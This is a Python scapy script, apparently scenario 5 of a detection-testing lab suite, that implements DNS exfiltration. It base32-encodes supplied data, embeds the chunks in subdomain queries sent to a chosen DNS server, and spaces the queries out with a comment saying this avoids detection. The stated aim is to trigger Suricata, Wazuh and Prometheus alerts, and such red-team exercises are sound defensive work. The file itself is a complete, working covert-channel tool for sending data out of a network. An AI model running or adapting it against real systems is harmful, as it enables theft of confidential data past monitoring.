#!/usr/bin/env python3
"""
Scenario 5: DNS Exfiltration (Covert Data Channel)
- Difficulty: Intermediate
- Detection: Suricata, Wazuh, Prometheus
- Expected Alert: Suspicious DNS patterns, DNS tunneling detection
"""

import sys
import argparse
import logging
import time
import base64
from scapy.all import IP, UDP, DNS, DNSQR, send, conf

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

conf.verbose = False

class DNSExfiltrationScenario:
    def __init__(self, target, data_to_exfil="confidential_data", chunk_size=32, verbose=False):
        self.target = target
        self.data = data_to_exfil
        self.chunk_size = chunk_size
        self.verbose = verbose
        self.queries_sent = 0
        self.results = {
            'scenario': 'DNS_EXFILTRATION',
            'target': target,
            'data_exfiltrated': data_to_exfil,
            'queries_sent': 0,
            'status': 'pending'
        }

    def encode_data_for_dns(self, data):
        """Encode data to be DNS-safe"""
        encoded = base64.b32encode(data.encode()).decode().lower()
        return encoded

    def chunk_data(self, data, size):
        """Split data into chunks"""
        chunks = [data[i:i+size] for i in range(0, len(data), size)]
        return chunks

    def exfiltrate_via_dns(self):
        """Exfiltrate data through DNS queries"""
        logger.info(f"[*] Starting DNS Exfiltration to {self.target}")
        logger.info(f"[*] Data to exfiltrate: {len(self.data)} bytes")

        # Encode data
        encoded_data = self.encode_data_for_dns(self.data)
        chunks = self.chunk_data(encoded_data, self.chunk_size)

        logger.info(f"[*] Encoded data length: {len(encoded_data)} bytes")
        logger.info(f"[*] Number of DNS queries required: {len(chunks)}")

        start_time = time.time()

        try:
            for idx, chunk in enumerate(chunks):
                # Create DNS query with data embedded in subdomain
                domain = f"{chunk}.exfil.internal.local"

                pkt = IP(dst=self.target) / UDP(dport=53) / DNS(
                    rd=1,
                    qd=DNSQR(qname=domain, qtype='A')
                )

                try:
                    send(pkt, verbose=0)
                    self.queries_sent += 1

                    if self.verbose:
                        logger.info(f"[+] Query {idx+1}/{len(chunks)}: {domain}")

                    time.sleep(0.5)  # Stagger queries to avoid detection
                except Exception as e:
                    logger.warning(f"[-] Error sending query {idx+1}: {e}")

        except KeyboardInterrupt:
            logger.info("\n[!] Exfiltration interrupted by user")
        except Exception as e:
            logger.error(f"[-] Exfiltration failed: {e}")
            self.results['status'] = 'failed'
            return

        elapsed = time.time() - start_time
        self.results['queries_sent'] = self.queries_sent
        self.results['duration'] = elapsed
        self.results['status'] = 'completed'
        self.log_results()

    def log_results(self):
        """Log exfiltration results"""
        logger.info("\n" + "="*60)
        logger.info("DNS EXFILTRATION RESULTS")
        logger.info("="*60)
        logger.info(f"Target DNS Server: {self.target}")
        logger.info(f"Data Exfiltrated: {self.data}")
        logger.info(f"Data Size: {len(self.data)} bytes")
        logger.info(f"Queries Sent: {self.queries_sent}")
        logger.info(f"Duration: {self.results.get('duration', 0):.2f}s")
        logger.info(f"Status: {self.results['status'].upper()}")
        logger.info("="*60)
        logger.info("\n[!] Check Monitoring Systems:")
        logger.info("  - Suricata: Look for DNS tunneling patterns")
        logger.info("  - Wazuh: Search for 'DNS exfiltration' or 'DNS tunnel'")
        logger.info("  - Prometheus: Monitor unusual DNS query volume/patterns")
        logger.info("  - Check for subdomain queries with base32-encoded data")
        logger.info("="*60 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description='DNS Exfiltration (Covert Channel) Scenario',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python 05_dns_exfiltration.py --target 10.10.10.10 --data "secret_password"
  python 05_dns_exfiltration.py --target 192.168.1.1 --data "database_dump" --verbose
        '''
    )

    parser.add_argument('--target', required=True, help='Target DNS server IP')
    parser.add_argument('--data', default='confidential_data', help='Data to exfiltrate')
    parser.add_argument('--chunk-size', type=int, default=32, help='Chunk size for DNS queries')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')

    args = parser.parse_args()

    scenario = DNSExfiltrationScenario(
        target=args.target,
        data_to_exfil=args.data,
        chunk_size=args.chunk_size,
        verbose=args.verbose
    )

    scenario.exfiltrate_via_dns()

if __name__ == '__main__':
    main()
